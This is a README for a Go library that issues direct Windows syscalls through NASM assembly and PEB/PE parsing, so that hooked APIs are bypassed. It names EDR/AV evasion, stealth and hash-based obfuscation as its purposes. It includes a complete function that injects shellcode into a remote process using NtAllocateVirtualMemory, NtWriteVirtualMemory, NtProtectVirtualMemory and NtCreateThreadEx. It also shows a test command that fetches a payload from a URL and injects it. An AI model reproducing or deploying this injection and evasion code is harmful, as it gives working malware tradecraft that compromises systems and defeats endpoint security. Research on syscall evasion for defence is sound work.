# Windows Direct Syscall Library for Go

A Go library providing **TRUE direct Windows API syscalls** using external assembly and PE parsing. This library enables developers to call any Windows API function directly through syscalls, bypassing traditional API hooking points.

##  Features

- **True Direct Syscalls**: Raw `syscall` instructions with manually resolved syscall numbers
- **No API Dependencies**: Bypasses `GetProcAddress`, `LoadLibrary`, and all traditional Windows APIs
- **External Assembly**: Intel NASM assembly compiled separately and linked via cgo
- **Clean Library Interface**: Simple, easy-to-use functions for any Windows API call
- **Obfuscation Support**: Function name hashing for stealth operations
- **Comprehensive Constants**: All common Windows constants included
- **Type Safety**: Strongly typed function signatures for common APIs

## Demo
![demo](https://github.com/user-attachments/assets/b98dbd75-bfb0-4403-8f78-3c9a36ea5676)

## Quick Start

### Installation

```bash
go get github.com/carved4/go-direct-syscall
```

### Basic Usage

```go
package main

import (
    "fmt"
    "unsafe"
    
    winapi "github.com/carved4/go-direct-syscall"
)

func main() {
    // Allocate memory using direct syscalls
    currentProcess := uintptr(0xFFFFFFFFFFFFFFFF) // Current process
    var baseAddress uintptr

    size := uintptr(4096)
    
    status, err := winapi.NtAllocateVirtualMemory(
        currentProcess,
        &baseAddress,
        0,
        &size,
        winapi.MEM_COMMIT|winapi.MEM_RESERVE,
        winapi.PAGE_READWRITE,
    )
    
    if err != nil {
        panic(err)
    }
    
    if status == winapi.STATUS_SUCCESS {
        fmt.Printf("Memory allocated at: 0x%X\n", baseAddress)
    }
}
```

## API Reference

### Core Functions

#### `DirectSyscall(functionName string, args ...uintptr) (uintptr, error)`
Execute any Windows API function by name using direct syscalls.

```go
// Call any NTDLL function directly
status, err := winapi.DirectSyscall("NtQuerySystemInformation", 
    winapi.SystemBasicInformation,
    uintptr(unsafe.Pointer(&buffer[0])),
    uintptr(len(buffer)),
    uintptr(unsafe.Pointer(&returnLength)),
)
```

#### `DirectSyscallByHash(functionHash uint32, args ...uintptr) (uintptr, error)`
Execute syscalls using pre-computed function name hashes for obfuscation.

```go
hash := winapi.GetFunctionHash("NtAllocateVirtualMemory")
status, err := winapi.DirectSyscallByHash(hash, args...)
```

### Common API Functions

The library provides strongly-typed wrappers for common Windows APIs:

- `NtAllocateVirtualMemory` - Allocate memory in processes
- `NtWriteVirtualMemory` - Write to process memory  
- `NtReadVirtualMemory` - Read from process memory
- `NtProtectVirtualMemory` - Change memory protection
- `NtCreateThreadEx` - Create threads in processes
- `NtOpenProcess` - Open process handles
- `NtQuerySystemInformation` - Query system information
- `NtQueryInformationProcess` - Query process information
- `NtCreateFile` / `NtReadFile` / `NtWriteFile` - File operations
- `NtClose` - Close handles

### Utility Functions

#### `GetSyscallNumber(functionName string) uint16`
Get the syscall number for debugging purposes.

#### `GetFunctionHash(functionName string) uint32`
Get the hash of a function name for obfuscation.

#### `DumpAllSyscalls() ([]SyscallInfo, error)`
Enumerate and dump all available syscalls from ntdll.dll with their syscall numbers, hashes, and addresses.

## Syscall Discovery & Analysis

###  DumpAllSyscalls Feature

The library includes a powerful syscall enumeration feature that can discover and analyze all available Windows syscalls on the current system. This is invaluable for research, debugging, and understanding the Windows API landscape.

#### Command Line Usage

```bash
# Dump all syscalls to console and JSON file
./cmd.exe -dump
```

#### Console Output
```
Starting syscall enumeration...
Successfully got PEB at 0x8DFAD6000, Ldr at 0x7FF87D45C4C0
Found module: cmd.exe (base: 0x7FF719D70000)
Found module: ntdll.dll (base: 0x7FF87D2F0000)
Hash match for ntdll.dll! Hash: 0x1EDAB0ED
Found ntdll.dll at: 0x7FF87D2F0000
PE SizeOfImage: 2064384 bytes
Found 2435 exports in ntdll.dll
Found 942 syscall functions:

SSN  Function Name                            Hash         Address
---- ---------------------------------------- ------------ ----------------
1    ZwWorkerFactoryWorkerReady               0x1F4EFAF7   0x7FF87D38D500
1    NtWorkerFactoryWorkerReady               0xE5659C68   0x7FF87D38D500
2    ZwAcceptConnectPort                      0x59025CF5   0x7FF87D38D520
2    NtAcceptConnectPort                      0x44832B86   0x7FF87D38D520
3    ZwMapUserPhysicalPagesScatter            0xEEA7A3F6   0x7FF87D38D540
3    NtMapUserPhysicalPagesScatter            0x5D849BC7   0x7FF87D38D540
```

#### JSON Export Structure

The dump automatically generates a timestamped JSON file with complete syscall information:

```json
{
  "timestamp": "2025-06-06T12:20:11-04:00",
  "system_info": {
    "os": "Windows",
    "architecture": "x64",
    "ntdll_base": "0x7FF87D380000"
  },
  "syscalls": [
    {
      "Name": "ZwWorkerFactoryWorkerReady",
      "Hash": 525269751,
      "SyscallNumber": 1,
      "Address": 140705229493504
    },
    {
      "Name": "NtWorkerFactoryWorkerReady",
      "Hash": 3848641640,
      "SyscallNumber": 1,
      "Address": 140705229493504
    },
    {
      "Name": "ZwAcceptConnectPort",
      "Hash": 1493327093,
      "SyscallNumber": 2,
      "Address": 140705229493536
    },
    {
      "Name": "NtAcceptConnectPort",
      "Hash": 1149447046,
      "SyscallNumber": 2,
      "Address": 140705229493536
    },
    {
      "Name": "ZwMapUserPhysicalPagesScatter",
      "Hash": 4003963894,
      "SyscallNumber": 3,
      "Address": 140705229493568
    },
```

#### Using DumpAllSyscalls Programmatically

```go
package main

import (
    "fmt"
    "log"
    
    winapi "github.com/carved4/go-direct-syscall"
)

func main() {
    // Dump all syscalls
    syscalls, err := winapi.DumpAllSyscalls()
    if err != nil {
        log.Fatal("Failed to dump syscalls:", err)
    }
    
    fmt.Printf("Found %d syscalls\n", len(syscalls))
    
    // Find specific syscalls
    for _, sc := range syscalls {
        if sc.Name == "NtAllocateVirtualMemory" {
            fmt.Printf("Found NtAllocateVirtualMemory:\n")
            fmt.Printf("  SSN: %d\n", sc.SyscallNumber)
            fmt.Printf("  Hash: 0x%X\n", sc.Hash)
            fmt.Printf("  Address: 0x%X\n", sc.Address)
        }
    }
}
```

#### Key Features

- **Complete Discovery**: Finds all Nt*/Zw* syscall functions in ntdll.dll
- **Rich Metadata**: Syscall numbers, function hashes, and memory addresses
- **Persistent Storage**: Automatic JSON export with timestamps
- **Duplicate Detection**: Shows Nt*/Zw* function pairs with same syscall numbers
- **Analysis Ready**: Structured data perfect for research and automation
- **Research Friendly**: Includes system context and metadata

#### Use Cases

**Security Research**
- Map the complete Windows syscall landscape
- Track syscall changes across Windows versions
- Identify new or modified syscalls in updates

**Malware Analysis**
- Understand available syscalls for evasion techniques
- Pre-compute function hashes for obfuscation
- Analyze syscall usage patterns

**System Administration**
- Audit available system calls
- Compare syscalls across different systems
- Generate reference documentation

**Development & Debugging**
- Verify syscall resolution is working correctly
- Debug hash collisions or resolution issues
- Understand the true Windows API surface

## Build Requirements

### Prerequisites
- **Go 1.20+** with cgo enabled
- **NASM** for assembly compilation
- **GCC/MinGW** for linking (Windows)

### Build Process

The library includes pre-built assembly objects, but you can rebuild them:

```bash
# Assemble the syscall function
nasm -f win64 do_syscall.S -o do_syscall.obj

# Create static library
ar rcs libdo_syscall.a do_syscall.obj

# Build your Go application
go build
```

##  How It Works

### Architecture

```
Your Go Code
     ↓
Library Interface (winapi.go)
     ↓
Hash Resolution (obf package)
     ↓
PE Parsing (syscallresolve package)
     ↓
cgo Bridge (syscall package)
     ↓
Raw NASM Assembly (do_syscall.S)
     ↓
Direct Syscall Instruction
     ↓
Windows NT Kernel
```

### Direct Syscall Flow

1. **Function Name** → **Hash** (DBJ2 algorithm)
2. **PEB Walking** → Find NTDLL base address (no LoadLibrary)
3. **PE Parsing** → Find function address (no GetProcAddress)
4. **Memory Reading** → Extract syscall number from function stub
5. **Assembly Call** → Execute raw `syscall` instruction
6. **Return** → NTSTATUS result

### Assembly Function

The core assembly function in `do_syscall.S`:

```nasm
global do_syscall
section .text

do_syscall:
    mov [rsp - 0x8],  rsi
    mov [rsp - 0x10], rdi

    mov eax, ecx
    mov rcx, rdx

    mov r10, r8
    mov rdx, r9

    mov  r8,  [rsp + 0x28]
    mov  r9,  [rsp + 0x30]

    sub rcx, 0x4
    jle skip

    lea rsi,  [rsp + 0x38]
    lea rdi,  [rsp + 0x28]

    rep movsq
skip:
    syscall

    mov rsi, [rsp - 0x8]
    mov rdi, [rsp - 0x10]

    ret 

```

## Use Cases

### Security Research
- Bypass API hooks and monitoring
- Analyze Windows internals
- Test EDR/AV evasion techniques

### System Programming
- Low-level Windows operations
- Custom memory management
- Process manipulation
- File system operations

### Stealth Operations
- Avoid API call detection

## Using the WinAPI Library

The `winapi` package provides a high-level interface for Windows syscalls with proper type safety and error handling. Here's how to use it effectively:

### Basic Memory Operations

```go
package main

import (
    "fmt"
    "unsafe"
    
    "github.com/carved4/go-direct-syscall"
)

func main() {
    // Get current process handle
    currentProcess := uintptr(0xFFFFFFFFFFFFFFFF)
    
    // Allocate memory
    var baseAddress uintptr
    size := uintptr(4096)
    
    status, err := winapi.NtAllocateVirtualMemory(
        currentProcess,
        &baseAddress,
        0,
        &size,
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x04,          // PAGE_READWRITE
    )
    
    if err != nil || status != 0 {
        panic(fmt.Sprintf("Failed to allocate memory: 0x%X", status))
    }
    
    fmt.Printf("Allocated memory at: 0x%X\n", baseAddress)
    
    // Write data to memory
    data := []byte("Hello, World!")
    var bytesWritten uintptr
    
    status, err = winapi.NtWriteVirtualMemory(
        currentProcess,
        baseAddress,
        unsafe.Pointer(&data[0]),
        uintptr(len(data)),
        &bytesWritten,
    )
    
    if status == 0 {
        fmt.Printf("Wrote %d bytes successfully\n", bytesWritten)
    }
    
    // Read data back
    buffer := make([]byte, len(data))
    var bytesRead uintptr
    
    status, err = winapi.NtReadVirtualMemory(
        currentProcess,
        baseAddress,
        unsafe.Pointer(&buffer[0]),
        uintptr(len(buffer)),
        &bytesRead,
    )
    
    if status == 0 {
        fmt.Printf("Read back: %s\n", string(buffer))
    }
}
```

### Process Manipulation

```go
// Open a process by PID
var processHandle uintptr
pid := uintptr(1234) // Target process ID

// Create CLIENT_ID structure
clientId := struct {
    UniqueProcess uintptr
    UniqueThread  uintptr
}{
    UniqueProcess: pid,
    UniqueThread:  0,
}

status, err := winapi.NtOpenProcess(
    &processHandle,
    0x1F0FFF, // PROCESS_ALL_ACCESS
    0,        // No object attributes
    uintptr(unsafe.Pointer(&clientId)),
)

if status == 0 {
    fmt.Printf("Opened process handle: 0x%X\n", processHandle)
    
    // Don't forget to close the handle
    defer winapi.NtClose(processHandle)
}
```

### Thread Creation and Injection

```go
// Inject shellcode into a remote process
func InjectShellcode(processHandle uintptr, shellcode []byte) error {
    // Allocate memory in target process
    var baseAddress uintptr
    size := uintptr(len(shellcode))
    
    status, err := winapi.NtAllocateVirtualMemory(
        processHandle,
        &baseAddress,
        0,
        &size,
        0x1000|0x2000, // MEM_COMMIT | MEM_RESERVE
        0x04,          // PAGE_READWRITE
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("allocation failed: 0x%X", status)
    }
    
    // Write shellcode
    var bytesWritten uintptr
    status, err = winapi.NtWriteVirtualMemory(
        processHandle,
        baseAddress,
        unsafe.Pointer(&shellcode[0]),
        uintptr(len(shellcode)),
        &bytesWritten,
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("write failed: 0x%X", status)
    }
    
    // Change protection to executable
    var oldProtect uintptr
    status, err = winapi.NtProtectVirtualMemory(
        processHandle,
        &baseAddress,
        &size,
        0x20, // PAGE_EXECUTE_READ
        &oldProtect,
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("protect failed: 0x%X", status)
    }
    
    // Create thread to execute shellcode
    var threadHandle uintptr
    status, err = winapi.NtCreateThreadEx(
        &threadHandle,
        0x1F03FF, // THREAD_ALL_ACCESS
        0,         // No object attributes
        processHandle,
        baseAddress, // Start address (our shellcode)
        0,           // No parameter
        0,           // No creation flags
        0,           // Zero bits
        0,           // Stack size
        0,           // Maximum stack size
        0,           // No attribute list
    )
    
    if err != nil || status != 0 {
        return fmt.Errorf("thread creation failed: 0x%X", status)
    }
    
    fmt.Printf("Created thread handle: 0x%X\n", threadHandle)
    winapi.NtClose(threadHandle)
    
    return nil
}
```

### Using Raw DirectSyscall for Any API

```go
// Call any NTDLL function directly by name
func QuerySystemInfo() {
    // SystemBasicInformation = 0
    var buffer [48]byte // SYSTEM_BASIC_INFORMATION size
    var returnLength uintptr
    
    status, err := winapi.DirectSyscall("NtQuerySystemInformation",
        0, // SystemBasicInformation
        uintptr(unsafe.Pointer(&buffer[0])),
        uintptr(len(buffer)),
        uintptr(unsafe.Pointer(&returnLength)),
    )
    
    if status == 0 {
        fmt.Printf("System info retrieved, %d bytes\n", returnLength)
    }
}

// Use function hash for obfuscation
func ObfuscatedCall() {
    hash := winapi.GetFunctionHash("NtQuerySystemInformation")
    
    status, err := winapi.DirectSyscallByHash(hash,
        0, // SystemBasicInformation
        // ... other args
    )
}
```

### Error Handling

```go
// Proper NTSTATUS checking
func CheckNTStatus(status uintptr, operation string) error {
    if status == 0 {
        return nil // STATUS_SUCCESS
    }
    
    switch status {
    case 0xC0000005:
        return fmt.Errorf("%s failed: ACCESS_VIOLATION", operation)
    case 0xC0000008:
        return fmt.Errorf("%s failed: INVALID_HANDLE", operation)
    case 0xC000000D:
        return fmt.Errorf("%s failed: INVALID_PARAMETER", operation)
    default:
        return fmt.Errorf("%s failed: NTSTATUS 0x%X", operation, status)
    }
}

// Usage example
status, err := winapi.NtAllocateVirtualMemory(/* args */)
if err := CheckNTStatus(status, "NtAllocateVirtualMemory"); err != nil {
    log.Fatal(err)
}
```

### Important Notes

1. **Handle Management**: Always close handles with `NtClose()` when done
2. **Error Checking**: Check both the Go error and NTSTATUS return value
3. **Memory Safety**: Be careful with `unsafe.Pointer` conversions
4. **Debugging**: Use `GetSyscallNumber()` to verify function resolution
5. **Timing**: Some operations may require delays (like the debug print in `NtWriteVirtualMemory`)

### Common NTSTATUS Values

- `0x00000000` - STATUS_SUCCESS
- `0xC0000005` - STATUS_ACCESS_VIOLATION  
- `0xC0000008` - STATUS_INVALID_HANDLE
- `0xC000000D` - STATUS_INVALID_PARAMETER
- `0xC0000022` - STATUS_ACCESS_DENIED
- Use function name obfuscation
- Direct kernel communication

## Security Considerations

- **Kernel-level Detection**: Direct syscalls may still be monitored at the kernel level
- **Process Protection**: Some protected processes resist manipulation
- **NTSTATUS Handling**: Always check return codes for error conditions
- **Memory Safety**: Use appropriate memory protection and bounds checking

## Examples

See the cmd/main.go file for an example 

- **Basic Memory Operations**: Allocation, reading, writing
- **Process Manipulation**: Opening processes, thread creation
- **File Operations**: Creating, reading, writing files
- **System Queries**: Getting system and process information
- **Obfuscation**: Using function hashes for stealth

## Testing

```bash
cd go-direct-syscalls

bash build.sh

# Dump all syscalls (no injection, safe for analysis)
./cmd.exe -dump

# Run example injection with embedded calc shellcode
./cmd.exe -example 

# Run injection with custom payload from URL
./cmd.exe -url http://example.com/payload.bin

# this will run the main program to list injectible processes, and prompt for a selection
# the shellcode you're injecting is a simple pop calc shellcode, obviously be smart about running shellcode from github repos
# so feel free to use donut or msfvenom or similar to generate your own calc shellcode and replace GetEmbeddedShellcode func

```

## Contributing

Contributions are welcome! Please feel free to:

- Add more Windows API function wrappers
- Improve error handling
- Add more comprehensive examples
- Optimize performance
- Add support for additional architectures

## License

This project is provided for **educational and research purposes only**. Users are responsible for complying with all applicable laws and regulations.

## Credits

- **Original Concept**: Extracted from [Whitecat18's Rust implementation](https://github.com/Whitecat18/Rust-for-Malware-Development/tree/main/syscalls/direct_syscalls)
- **Assembly Implementation**: Based on [janoglezcampos/rust_syscalls](https://github.com/janoglezcampos/rust_syscalls)

##  Disclaimer

This tool is provided for **educational and research purposes only**. Use of this software for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable laws. The developers assume no liability and are not responsible for any misuse or damage caused by this program.
